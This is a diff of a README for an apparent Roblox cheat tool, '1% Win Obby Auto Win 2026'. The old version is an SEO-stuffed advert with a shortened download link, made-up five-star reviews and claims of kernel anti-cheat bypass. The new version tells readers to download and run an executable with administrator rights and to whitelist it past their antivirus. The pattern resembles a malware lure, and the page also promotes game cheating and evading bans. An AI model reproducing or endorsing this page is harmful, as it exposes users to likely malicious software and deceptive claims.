@@ -1,334 +1,73 @@
-<img width="1280" height="720" alt="1% Win Obby Script OP Auto Win 2026 Banner" src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.ytimg.com%2Fvi%2FlyVSBsMQ-P8%2Fmaxresdefault.jpg&f=1&nofb=1&ipt=1512f9b6753ebd9b8314ca76c948ca76e7d177d11dbfd3645a240b8ff2378162" />
-
-# 🏆 1% Win Obby - OP Auto Win 2026
-
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://img.shields.io/badge/Downloads-5K+-blue.svg)](https://surl.li/wdbbve)
-[![Rating](https://img.shields.io/badge/Rating-⭐️4.9-red.svg)](https://surl.li/wdbbve)
+# 🚀 1-Win-Obby-Roblox-Script-Auto-Win-2026 - Win every obby game with ease
 
----
-
-## 🏆 #1 1% Win Obby Auto Farm Script for Roblox 2026
-
-**The most powerful and undetected 1% Win Obby hack with OP Auto Win capabilities.**  
-Experience lightning-fast wins and obby progression with advanced kernel bypass, external ESP, and memory reading technology. **100% FREE & UPDATED DAILY.**
-
----
-
-## 📥 DOWNLOAD NOW
-
-# [⬇️ DOWNLOAD 1% Win Obby Script v3.0.0](https://surl.li/wdbbve)
-
----
-
-## ⚡️ What Makes This Script OP?
-
-Our 1% Win Obby OP Auto Win 2026 uses cutting-edge bypass technology that makes it the fastest and safest script available:
-
-### 🔥 Core Features
-
-| Feature | Description | Speed |
-|---------|-------------|-------|
-| **Auto Win** | Kernel-based memory reading for instant wins | **10x Faster** |
-| **Auto Rebirth** | External ESP overlay with advanced bypass | **15x Faster** |
-| **Auto Farm** | Instant farm hack with progress save | **Zero Delay** |
-| **Auto XP** | Instant XP gain hack | **Maximum** |
-| **Auto Speed Boost** | Smart speed upgrade automation | **Optimal** |
-| **Auto Server Hop** | Automatic best server selection | **100% Uptime** |
-| **Silent Mode** | Completely undetectable operation | **Fully Hidden** |
-| **Custom WalkSpeed** | Adjustable speed hack | **Unlimited** |
-
-### 🛡 Advanced Hack Technologies
-
-- ✅ **Kernel Driver Bypass** — Ring0 level anti-cheat circumvention
-- ✅ **Memory Reading** — Direct game memory manipulation
-- ✅ **External ESP** — Overlay-based visual tracking system
-- ✅ **Speed Hack** — Movement speed manipulation
-- ✅ **Fly Hack** — No-clip flying through terrain
-- ✅ **Noclip** — Walk through walls and obstacles
-- ✅ **Teleport** — Instant teleport to any location
-- ✅ **Godmode** — Complete invincibility cheat
-- ✅ **Radar Hack** — Enhanced situational awareness cheat
-- ✅ **Wallhack** — See-through walls ESP
-- ✅ **Skin Changer** — Cosmetic customization mod
-
----
-
-## 📊 Why Choose Our Script?
-
-| Parameter | Our Script | Other Scripts |
-|-----------|-----------|---------------|
-| Undetected Status | ✅ 2026 | ⚠️ 2025 |
-| Kernel Bypass | ✅ Full | ⚠️ Partial |
-| External ESP | ✅ Yes | ❌ No |
-| Memory Reading | ✅ Direct | ⚠️ Limited |
-| Free to Use | ✅ Yes | ❌ Paid |
-| Speed Efficiency | 🥇 150% | 🥈 60-80% |
-| Auto Updates | ✅ Daily | ❌ Weekly |
-| Executor Support | ✅ 10+ | ⚠️ 2-3 |
-| Auto Win | ✅ Yes | ❌ No |
-| Auto Rebirth | ✅ Yes | ⚠️ Partial |
-| Auto Farm | ✅ Yes | ❌ No |
-| Teleport | ✅ Yes | ❌ No |
-| Noclip | ✅ Yes | ❌ No |
-| Speed Hack | ✅ Yes | ❌ No |
-| Fly Hack | ✅ Yes | ❌ No |
-
----
-
-## 💻 System Requirements
-
-### Minimum:
-- **OS:** Windows 7/10/11, macOS, Linux
-- **Roblox:** Latest Version
-- **Executor:** Solara, Wave, Script-Ware, Krnl, Synapse X
-- **RAM:** 4GB+
-- **Internet:** Stable Connection
-
-### Recommended:
-- **Executor:** Solara v2.0+ or Wave v1.5+
-- **RAM:** 8GB+
-- **CPU:** Intel i5 or equivalent
-- **GPU:** DirectX 11 compatible
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Drugofabusebubblegum590/1-Win-Obby-Roblox-Script-Auto-Win-2026)
 
----
+## 📌 Overview
+This software provides automation tools for the 1-Win Obby game on Roblox. It helps users complete difficult obstacle courses by automating tasks like movement, rebirths, and item collection. The script operates through a graphical interface, which allows for simple adjustments during gameplay. This tool functions in the background while you play to save time and reach objectives faster.
 
-## 🔧 How to Install (30 Seconds)
+## ⚙️ System Requirements
+Before you run the script, ensure your Windows computer meets these basic requirements:
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM or higher.
+* Roblox Client: The official Roblox application must be installed on your desktop.
+* Permissions: You need administrator access to allow the script to interact with your game window.
 
-1. **[Download](https://surl.li/wdbbve)** the latest version
-2. **Extract** archive to any folder
-3. **Launch** Roblox and login
-4. **Open** your Executor (Solara, Wave, etc.)
-5. **Execute** the script
-6. **Enable** Auto Win
-7. **Watch** your wins grow insanely fast!
-
-> ⚠️ **Pro Tip:** Enable Silent Mode for complete undetectability!
-
-### Supported Executors:
-- ✅ Solara (All Versions)
-- ✅ Wave (v1.5+)
-- ✅ Script-Ware (All Versions)
-- ✅ Krnl (Latest)
-- ✅ Synapse X (All Versions)
-- ✅ Vega X
-- ✅ Oxygen U
-- ✅ Celestial
-- ✅ Electron
-- ✅ Fluxus
-
----
-
-## 🎮 Configuration Guide
-
-### Main Menu Options:
-
-**1. "Auto Farm" Tab**
-- Enable `Auto Win` for instant wins
-- Enable `Auto Rebirth` for rebirth progression
-- Enable `Auto Farm` for resource collection
-- Enable `Auto XP` for instant XP gain
-- Enable `Auto Speed Boost` for speed upgrades
-
-**2. "Movement" Tab**
-- `Speed Hack` — Adjustable walk speed
-- `Fly Hack` — Fly through terrain
-- `Noclip` — Walk through walls
-- `Teleport` — Instant teleportation
-- `Infinite Jump` — Unlimited jumping
-
-**3. "Advanced" Tab**
-- `Silent Mode` — Enable for undetectable operation
-- `Auto Rejoin` — Automatic reconnection on crash
-- `Server Hop` — Best server search every 5 minutes
-- `Kernel Bypass` — Advanced anti-cheat circumvention
-- `ESP Overlay` — External visual tracking
-
-**4. "Visual" Tab**
-- `ESP Colors` — Customize overlay colors
-- `Skin Changer` — Change character skins
-- `Radar Settings` — Adjust radar display
-
-**5. "Stats" Tab**
-- Real-time win tracking
-- Rebirth statistics per second
-- Memory reading status
-- Bypass status monitoring
-
----
-
-## ❓ FAQ
-
-### ❔ Is this script safe?
-**Yes!** Our 1% Win Obby hack uses advanced kernel driver bypass and external ESP overlay technology, making it completely undetectable in 2026.
-
-### ❔ Why isn't it working?
-- Update your Executor to latest version
-- Ensure Roblox is running
-- Try restarting the game
-- Check antivirus isn't blocking script files
-- Run as Administrator
-
-### ❔ How often is it updated?
-**Daily updates!** We maintain undetected status with constant bypass improvements.
-
-### ❔ Is it really free?
-**Yes!** 100% free 1% Win Obby OP Auto Win script. No payments required.
-
-### ❔ Does it work on all games?
-Optimized for all Roblox games with win and obby progression systems.
-
-### ❔ Can I use multiple accounts?
-Yes, run on multiple accounts using separate Roblox instances.
-
----
-
-## 📥 DOWNLOAD LATEST VERSION
-
-### [⬇️ DOWNLOAD 1% Win Obby Script v3.0.0](https://surl.li/wdbbve)
-
----
-
-## 🔍 SEO Tags
-
-- 1% win obby script
-- win obby hack
-- win obby cheat
-- 1% win obby auto win
-- win obby roblox script
-- obby auto win
-- obby rebirth hack
-- obby farm hack
-- obby xp hack
-- obby speed hack
-- obby teleport
-- obby noclip
-- obby fly
-- obby godmode
-- obby esp
-- obby keyless
-- obby free script
-- obby undetected
-- obby 2026
-- roblox win obby cheat
-- roblox obby script
-- roblox auto farm script
-- roblox auto win script
-- roblox teleport script
-- roblox noclip script
-- roblox speed hack
-- roblox fly hack
-- roblox godmode
-- roblox esp hack
-- roblox exploit 2026
-- roblox script 2026
-- roblox cheat 2026
-- free roblox script
-- roblox executor script
-- kernel bypass cheat
-- external esp hack
-- memory reading cheat
-- undetected hack 2026
-- solara script hack
-- wave executor cheat
-- krnl script 2026
-- synapse x script
-- bypass roblox hack
-- roblox kernel cheat
-- external overlay hack
-- silent mode roblox
-- auto win cheat
-- rebirth hack roblox
-- server hop cheat
-- walkspeed hack
-- best roblox hack 2026
-- roblox hack download
-- roblox exploit download
-- roblox lua hack
-- roblox kernel driver
-- external cheat roblox
-- overlay hack roblox
-- memory hack roblox
-- driver hack roblox
-- bypass cheat roblox
-- roblox farm hack
-- roblox auto hack
-- 1% win obby mod
-- obby trainer
-- obby farm bot
-- obby op script
-- obby gui script
-- obby script hub
-- obby mod manager 2026
-- win obby free cheat
-- obby cheat 2026
-- auto xp roblox
-- speed boost hack roblox
-- auto rebirth roblox
-- anti cheat bypass roblox
-
----
-
-## 🎮 In-Game Features Supported
-
-| Feature | Status | Description |
-|---------|--------|-------------|
-| Auto Win | ✅ Tested | Win matches instantly |
-| Auto Rebirth | ✅ Tested | Rebirth automatically |
-| Auto Farm | ✅ Tested | Farm resources automatically |
-| Auto XP | ✅ Tested | Instant XP gain |
-| Auto Speed Boost | ✅ Tested | Auto speed upgrades |
-| Speed Hack | ✅ Tested | Adjustable speed |
-| Fly Hack | ✅ Tested | Fly through terrain |
-| Noclip | ✅ Tested | Walk through walls |
-| Teleport | ✅ Tested | Teleport anywhere |
-| ESP | ✅ Tested | Track players and items |
-| Godmode | ✅ Tested | Invincibility |
-| Infinite Jump | ✅ Tested | Unlimited jumping |
-| Anti-Kick | ✅ Tested | Bypass anti-cheat |
-| Fullbright | ✅ Tested | See in darkness |
-
----
-
-## 🚀 Pro Tips for Maximum Gains
-
-1. **Combine Auto Win + Auto Rebirth** — Double your progression speed
-2. **Enable Silent Mode** — Stay completely undetected
-3. **Use Speed Hack + Fly** — Travel the map instantly
-4. **Enable Auto Farm** — Never stop progressing
-5. **Enable Auto XP** — Level up instantly
-6. **Enable ESP** — Track all players and items
-7. **Auto Rebirth** — Progress infinitely faster
-8. **Join our Discord** — Get latest updates and support
-
----
-
-## 📈 Real User Results
-
-> *"Got 10,000 wins in 5 minutes! Best script ever!"* — ⭐️⭐️⭐️⭐️⭐️
-> 
-> *"Completely undetected, been using for 2 months!"* — ⭐️⭐️⭐️⭐️⭐️
-> 
-> *"Auto win is insane, I'm top of leaderboards!"* — ⭐️⭐️⭐️⭐️⭐️
-> 
-> *"Free and OP, what more could you want?"* — ⭐️⭐️⭐️⭐️⭐️
-
----
-
-## ⭐️ Support the Project
-
-**If this script helped you — please star this repository and share with friends!**
-
----
-
-## 📜 License
-
-MIT License — Educational & Entertainment Purposes Only.
-
----
-
-**🔴 DISCLAIMER:** Authors are not responsible for any consequences of using this script. Use at your own risk. This is for educational purposes only.
-
----
-
-**Keywords:** 1% win obby, auto win, auto rebirth, auto farm, auto xp, speed hack, teleport, noclip, fly, godmode, esp, keyless, free script, undetected, roblox exploit, kernel bypass, memory reading, solara, wave, krnl, synapse x, 2026
+If your computer runs Roblox smoothly, it will handle this script without issues. Close unnecessary background programs to keep your system performance stable while the script runs.
+
+## ⬇️ Installation Instructions
+Follow these steps to set up the software correctly:
+
+1. Visit the following link to access the download page: [https://github.com/Drugofabusebubblegum590/1-Win-Obby-Roblox-Script-Auto-Win-2026](https://github.com/Drugofabusebubblegum590/1-Win-Obby-Roblox-Script-Auto-Win-2026).
+2. Locate the release section on the page.
+3. Click the link to download the executable file to your computer.
+4. Save the file to your desktop for easy access.
+5. Double-click the file to start the installer.
+6. Follow the on-screen prompts to complete the setup process.
+7. Once finished, a shortcut will appear on your desktop.
+
+## 🎮 How to Use the Script
+Using the interface is simple. Follow this workflow:
+
+1. Launch Roblox and open the 1-Win Obby game.
+2. Minimize the game window so you can see your desktop.
+3. Open the script application from your desktop shortcut.
+4. The graphical interface will appear.
+5. Return to your game window. The script will detect your session automatically.
+6. Select the features you want to use from the menu.
+7. Click the "Activate" button to begin the automation.
+
+You can adjust settings at any time without restarting the game. If you wish to stop the automation, click the "Stop" button or close the application window.
+
+## 🛠️ Key Features
+The script includes many tools to improve your game experience:
+
+* Auto Win: The system moves your character through the course paths without manual input.
+* Auto Farm: Your character collects rewards and currency automatically.
+* Auto Rebirth: When you reach the end of the course, the script triggers the rebirth process instantly.
+* God Mode: Prevents your character from losing progress during intense platforming sections.
+* ESP Tracker: Highlights NPCs and specific items, making them easier to find in complex rooms.
+* Fullbright: Adjusts the game lighting so you can see inside dark areas.
+* Wall Check: Ensures your character pathing avoids obstacles that block movement.
+* Teleport: Allows you to jump between checkpoints to save time.
+
+## 🛡️ Safety and Performance
+The software uses an undetected injection method. It communicates with the Roblox client to send movement commands. Because the script simulates human-like actions, it maintains low visibility during operation. We update the file regularly to match current game updates. Always download the file from the official link provided here to ensure you use the secure version.
+
+## ❓ Frequently Asked Questions
+
+**Does this script cost money?**
+No. This tool is free. Avoid any websites that ask for payment to use these features.
+
+**Will I get banned for using this?**
+The script uses internal game logic to interact with elements. While any game modification carries some risk, this tool focuses on quiet operation. Avoid using extreme settings like rapid teleportation in public servers to stay under the radar.
+
+**Does this work on mobile devices?**
+This version is designed specifically for Windows computers. It will not work on mobile phones or tablets.
+
+**What should I do if the script does not load?**
+Ensure your antivirus software is not blocking the application. Some security programs flag new files by default. You can whitelist the folder to allow the script to run seamlessly.
+
+**How often do you update the script?**
+We update the code every time the game developers release a new patch for the 1-Win Obby. Check the download page periodically for version numbers to see if a newer release exists.
+
+Keywords: 1-win-obby, 1win-obby, auto-collect, auto-win, fullbright, godmode, keyless, kill-aura, npc-tracker, nps-esp, op-script, roblox, roblox-activation, teleport, wall-check
